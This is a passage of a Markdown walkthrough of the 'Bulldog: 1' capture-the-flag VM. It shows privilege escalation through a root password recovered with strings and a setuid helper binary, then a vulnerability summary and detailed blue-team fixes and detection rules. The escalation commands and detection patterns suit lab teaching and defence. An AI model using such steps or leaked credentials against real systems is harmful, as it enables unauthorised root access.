> `strings` scans for runs of printable characters (default minimum length 4; `-n 6`
> asks for 6+) and prints them. **Any secret hard-coded in source code is recoverable
> from the compiled artefact in seconds.** Compiling does not encrypt anything.
>
> **`not stripped`** means symbol names survived, so `strings` output is rich and
> `objdump -D` / `gdb` will show function names.
>
> The other strings tell the story: the program calls `setuid`, then `/bin/su`, with
> the user `root`. It is a hard-coded privilege-elevation helper.
>
> **Run it, just to see:**
> ```bash
> bulldogadmin@bulldog:~$ /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp
> ```
> ```text
> Usage: ./customPermissionApp <command>
> ```
> ```bash
> bulldogadmin@bulldog:~$ /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp id
> uid=0(root) gid=0(root) groups=0(root)
> ```
> In some revisions the binary itself performs the elevation. In others you must use
> the password. **Take both.**

![strings revealing the root password](images/05-strings.png)

---

## 6. Privilege escalation

### 6.1 The direct route — `su root`

```bash
bulldogadmin@bulldog:~$ su root
Password: SUPERultimatePASSWORDyouCANTget
root@bulldog:/home/bulldogadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@bulldog:/home/bulldog# whoami
root
root@bulldog:/home/bulldog# hostname
bulldog
```

> **Note the prompt changed from `$` to `#`** — the universal UNIX convention for root.
> `uid=0(root) gid=0(root) groups=0(root)` is a genuine, complete root login (compare
> with a SUID escalation, which shows `uid=<you> euid=0(root)`).
>
> **This only worked because we upgraded the TTY in § 4.3.** Without a pseudo-terminal,
> `su` fails with `standard in must be a tty`.

### 6.2 The binary route

```bash
bulldogadmin@bulldog:~$ /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp '/bin/bash'
root@bulldog:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.3 Read the flag

```bash
root@bulldog:~# cd /root
root@bulldog:/root# ls -la
total 32
drwx------  3 root root 4096 Aug 26  2017 .
drwxr-xr-x 24 root root 4096 Aug 24  2017 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  914 Aug 26  2017 congrats.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  2 root root 4096 Aug 26  2017 .ssh
root@bulldog:/root# cat congrats.txt
```

```text
Congratulations! If you're reading this, you've rooted Bulldog Industries.

You've proven that you can think outside the box and find multiple ways to
interact with a system. That's the most important skill a pentester can have.

I hope you enjoyed the VM. If you have any questions, or found another way in,
please let me know!

  Nick Frichette
  @frichette_n
  frichetten.com
```

**Flag captured.** ✅

![Root and congrats.txt](images/06-flag.png)

### 6.4 Other things worth checking (the author's "all the ways" hint)

```bash
root@bulldog:/root# cat /etc/crontab; ls -la /etc/cron.d/
root@bulldog:/root# ss -tlnp
```

```text
State      Recv-Q Send-Q Local Address:Port  Peer Address:Port
LISTEN     0      128    *:23               *:*      users:(("sshd",pid=1022,fd=3))
LISTEN     0      128    *:80               *:*      users:(("nginx",pid=1101,fd=6))
LISTEN     0      128    *:8080             *:*      users:(("nginx",pid=1101,fd=7))
LISTEN     128    127.0.0.1:27017          *:*      users:(("mongod",pid=1188,fd=8))
```

> **MongoDB is listening on `127.0.0.1:27017`** — the half-installed service the
> `/dev/` page mentioned. It is bound to loopback, so it is not remotely reachable, but
> from a shell on the box:
> ```bash
> root@bulldog:~# mongo
> > show dbs
> admin   0.000GB
> local   0.000GB
> ```
> Unauthenticated local MongoDB access is a finding in its own right.
>
> Also worth reading, as root, to understand the box:
> ```bash
> root@bulldog:~# find / -name 'views.py' -path '*bulldog*' 2>/dev/null -exec cat {} \;
> ```
> That is the Django view implementing the web shell — read it and you will see the
> exact filter you bypassed, which is the best possible debrief.

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SSH moved to a non-standard port (security through obscurity) | port **23** | Found instantly by `-p-`; defeats naive tooling |
| 2 | Two nginx listeners exposing the same app | ports 80 and 8080 | Doubled attack surface for no benefit |
| 3 | Developer status page publicly reachable | `/dev/` | Disclosed architecture, tooling and the whole staff roster |
| 4 | **Password hashes leaked in HTML comments** | `/dev/` source | Seven employee credentials exposed |
| 5 | **Unsalted SHA-1 password hashing** | the leaked hashes | Cracked at ~3.8 M guesses/sec |
| 6 | Weak passwords (`bulldog`, `bulldoglover`) | `nick`, `sarah` | Dictionary-cracked in seconds |
| 7 | Django admin panel internet-facing | `/admin/` | Authenticated application access |
| 8 | **A command-execution interface on a production server** | `/dev/shell/` | By design, RCE |
| 9 | **Command-filter bypass via `$( )` substitution** | the web shell's allow-list | Arbitrary command execution |
| 10 | Web process runs as a named user with a home directory full of secrets | `bulldogadmin` | Credential disclosure |
| 11 | **Root password hard-coded in a compiled binary** | `.hiddenadmindirectory/customPermissionApp` | `bulldogadmin` → **root** |
| 12 | "Hidden" directory relies on a dot-prefix for secrecy | `.hiddenadmindirectory` | No access control whatsoever |
| 13 | Unauthenticated MongoDB on loopback | port 27017 | Local data compromise |
| 14 | Missing security headers (`X-Frame-Options`, `X-Content-Type-Options`, cookie `httponly`) | nginx / Django | Clickjacking, XSS-adjacent exposure |
| 15 | `gcc` present on the server | `/usr/bin/gcc` | Attackers can build exploits locally |

## 8. Defensive lessons (blue team)

1. **Never, ever leave credentials in HTML comments.** Assume the entire source of
   every page is public. Run a secret scanner over your templates in CI
   (`gitleaks`, `trufflehog`, `detect-secrets`) and fail the build on a hit. *"We'll
   remove these in prod"* is the most expensive sentence in software.
2. **Never ship a command-execution interface.** There is no safe way to build a
   browser-accessible shell. If operators need to run maintenance commands, use:
   - an **SSH jump host / bastion** with MFA and session recording;
   - **Ansible/Salt/Chef** for declarative, audited changes;
   - or a task queue where the *application* chooses from a fixed set of operations
     and no user-supplied string ever reaches a shell.
3. **If you must execute a command, never use a shell.** This is the actual fix for
   the filter bypass:
   ```python
   # WRONG — the shell interprets $( ), ;, &&, |, `, ...
   subprocess.check_output(user_input, shell=True)

   # RIGHT — no shell, no metacharacters are special, no bypass is possible
   ALLOWED = {"ls": ["/bin/ls"], "id": ["/usr/bin/id"], "pwd": ["/bin/pwd"]}
   parts = shlex.split(user_input)
   if parts[0] not in ALLOWED:
       raise PermissionError("command not allowed")
   subprocess.check_output(ALLOWED[parts[0]] + parts[1:], shell=False)
   ```
   Block-lists of `;`, `&&`, `|` and backticks are **unwinnable**. `$( )`,
   process substitution `<(...)`, brace expansion, `$IFS` tricks, quoting splits and
   encoding bypasses all defeat them.
4. **Use a proper password hash.** bcrypt, scrypt or argon2id — never SHA-1, never
   MD5, never unsalted. In Django this is already the default
   (`PBKDF2PasswordHasher`, now Argon2-capable); the leak here was not a hashing
   failure so much as a *"we hashed with SHA-1 and then pasted the hashes into a web
   page"* failure. Both matter.
5. **Enforce a real password policy.** `bulldog` and `bulldoglover` are in the top
   thousand of every wordlist. Require 12+ characters, screen against a breached-list
   API, and put MFA on the admin panel.
6. **Do not hide things behind dot-prefixed directory names.** `.hiddenadmindirectory`
   is readable by the very account that was compromised. Use filesystem permissions
   (`chmod 700`, owned by root), not naming conventions.
7. **Never hard-code secrets in binaries.** Compiling is not obfuscation — `strings`
   recovers every literal in seconds. Use environment variables injected at runtime,
   a systemd `LoadCredential=`/`CredentialsEncrypted=` directive, or a vault
   (HashiCorp Vault, AWS Secrets Manager). Then scan your artefacts:
   ```bash
   for f in $(find /opt /home -type f -executable 2>/dev/null); do
       strings -n 8 "$f" | grep -qiE 'password|secret|api[_-]?key' && echo "REVIEW: $f"
   done
   ```
8. **Do not run application code as a user with a password in `/etc/shadow`.** If the
   web app needs root for a specific operation, give it exactly that, narrowly:
   ```text
   # /etc/sudoers.d/bulldog-maintenance
   bulldogadmin ALL=(root) NOPASSWD: /usr/local/sbin/reload-nginx
   ```
   One command, absolute path, logged by sudo — not "the root password".
9. **Move SSH properly or not at all.** Port 23 is obscurity, not security. If you
   want to reduce noise, use `fail2ban`, key-only auth, and `AllowUsers`; keep the
   port at 22 so your monitoring tooling works.
10. **Add security headers and cookie flags:**
    ```nginx
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Referrer-Policy "no-referrer" always;
    ```
    ```python
    # Django settings.py
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_HTTPONLY = True
    CSRF_COOKIE_SECURE = True
    X_FRAME_OPTIONS = 'DENY'
    SECURE_HSTS_SECONDS = 31536000
    ```
11. **Do not bind unauthenticated databases, even to loopback.** MongoDB should run
    with `--auth` and a configured user, or not run at all. Remove half-installed
    services before go-live.
12. **Detection opportunities.**
    - WAF/log alert on any request to a path containing `shell`, on POSTs whose body
      includes `$(`, `` ` ``, `;`, `&&`, or `|`.
    - Process-lineage monitoring: `nginx`/`uwsgi`/`python` spawning `bash`, `sh`,
      `wget`, `python` or `gcc` is *always* an alert. (Sysmon for Linux, Wazuh,
      auditd `execve` rules.)
    - Alert on `su`/`sudo` to root from an application service account.
    - FIM on `/home/bulldogadmin` — new executables appearing in a web user's home
      directory should page someone.
    - Alert on outbound `wget`/`curl` from a web server to a non-allow-listed host.

---

## 9. References

- VulnHub entry: <https://vulnhub.com/entry/bulldog-1,211/>
- Author: Nick Frichette — <https://frichetten.com> (`@frichette_n`)
- Community writeups consulted:
  - [berzerk0 — CTF Writeup: Bulldog on VulnHub](https://gist.github.com/berzerk0/dd477837e5f07b05133bb21db8d51758) · [long-form version](https://berzerk0.github.io/GitPage/CTF-Writeups/Bulldog-Vulnhub-NonIntro.html)
  - [bl4de — Bulldog 1 VulnHub VM walkthrough](https://github.com/bl4de/VMs-walkthrough-writeups/blob/master/Bulldog_1/bulldog1_writeup.md)
  - [d7x — CTF: Bulldog 1 walkthrough](https://d7x.promiselabs.net/2018-02-03/ctf-bulldog-1-walkthrough/)
  - [MrcSec — Vulnhub write-up: Bulldog 1](https://mrcopy.gitlab.io/vulnhub-write-up-bulldog-1.html)
  - [0x00sec — [VulnHub] Bulldog: 1 Writeup](https://0x00sec.org/t/vulnhub-bulldog-1-writeup/10486)
  - [n00b security — VulnHub VM Bulldog 1](https://n00bsecurityblog.wordpress.com/2017-10-18/vulnhub-vm-bulldog-1/)
  - [cryptcut — Bulldog: 1 Vulnhub Walkthrough](https://medium.com/@cryptcut/bulldog-1-vulnhub-walkthrough-82750e11faa2)
  - [woowyland — Bulldog CTF Write-Up](https://woowyland.wordpress.com/2017-12-19/bulldog-ctf-write-up/)
  - [hackinghard — Bulldog](https://hackinghard.com/bulldog/)
- Background reading:
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
  - [OWASP — Use of a Broken or Risky Cryptographic Algorithm (SHA-1)](https://owasp.org/www-project-top-ten/)
  - [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html) · [CWE-798: Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
  - [`subprocess` — Security Considerations (Python docs)](https://docs.python.org/3/library/subprocess.html#security-considerations)
  - [Django security documentation](https://docs.djangoproject.com/en/stable/topics/security/) · [Django password hashing](https://docs.djangoproject.com/en/stable/topics/auth/passwords/)
  - [hashcat mode reference](https://hashcat.net/wiki/doku.php?id=example_hashes) · [CrackStation](https://crackstation.net/)
  - [`strings(1)` man page](https://man7.org/linux/man-pages/man1/strings.1.html)
  - [msfvenom / Metasploit multi-handler](https://docs.metasploit.com/) · [msfpc (payload generator wrapper)](https://github.com/g0tmi1k/msfpc)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
  - [GTFOBins](https://gtfobins.github.io)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — SSH on port 23, nginx on 80 and 8080
- [ ] `images/02-hashes.png` — the leaked SHA-1 hashes and hashcat/CrackStation results
- [ ] `images/03-webshell.png` — `/dev/shell/` and the `echo $(id)` bypass
- [ ] `images/04-shell.png` — reverse shell as `bulldogadmin` with a full TTY
- [ ] `images/05-strings.png` — `strings` revealing the root password
- [ ] `images/06-flag.png` — root and `/root/congrats.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
